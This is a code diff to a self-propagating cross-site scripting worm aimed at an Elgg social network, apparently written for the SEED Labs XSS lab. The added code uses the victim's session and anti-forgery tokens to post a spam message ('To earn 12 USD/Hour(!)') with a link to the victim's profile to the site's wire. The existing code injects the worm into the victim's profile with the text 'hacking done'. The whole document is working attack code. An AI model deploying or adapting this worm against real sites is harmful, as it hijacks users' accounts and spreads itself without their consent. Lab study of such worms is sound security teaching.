@@ -9,6 +9,8 @@ var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
 
     //Construct the content of your url
     var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
+    var sendurl2="http://www.xsslabelgg.com/action/thewire/add";
+        
     console.log('hemlo1');
     var namee = elgg.session.user.name;
 
@@ -17,11 +19,21 @@ var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
 	var token="&__elgg_token="+elgg.security.token.__elgg_token;
 	var description = '&description=' + wormCode;
     var name = "&name=" + namee;
-    var brief = '&briefdescription=' + 'account hacking done';
+    var brief = '&briefdescription=' + 'hacking done';
     var idd = '&guid=' + elgg.session.user.guid;
 
     var data = ts + token + name + description + brief + idd;
+    var name2 = elgg.session.user.username;
+    var postdata = 'To earn 12 USD/Hour(!), visit now \n';
+    var linkk = 'http://www.xsslabelgg.com/profile/'+name2;
+
+    var data2 = new FormData();
+    data2.append('__elgg_token', elgg.security.token.__elgg_token );
+    data2.append('__elgg_ts', elgg.security.token.__elgg_ts);
     
+    data2.append('body', postdata+linkk);
+    //"__elgg_token="+elgg.security.token.__elgg_token + ts + '&body=' + postdata + linkk;
+
     if(elgg.session.user.guid != elgg.page_owner.guid)
     {
 		//Create and send Ajax request to modify profile
@@ -33,6 +45,12 @@ var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
 	    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
     	Ajax.send(data);
+
+    	var Ajax2=null;
+	    Ajax2=new XMLHttpRequest();
+	    Ajax2.open("POST",sendurl2,true);
+	    Ajax2.setRequestHeader("Cookie",document.cookie);
+	    Ajax2.send(data2);
 	}
 
 
